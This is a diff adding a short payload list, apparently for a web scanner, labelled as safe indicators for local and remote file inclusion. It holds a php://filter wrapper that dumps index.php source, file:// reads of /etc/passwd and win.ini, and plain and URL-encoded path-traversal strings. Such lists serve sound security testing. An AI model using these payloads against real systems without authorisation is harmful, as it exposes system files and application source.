@@ -1,0 +1,6 @@
+# LFI/RFI indicator payloads (safe, detect error msgs only)
+php://filter/convert.base64-encode/resource=index.php
+file:///etc/passwd
+file:///windows/win.ini
+../../../../etc/passwd
+..%2F..%2Fetc%2Fpasswd
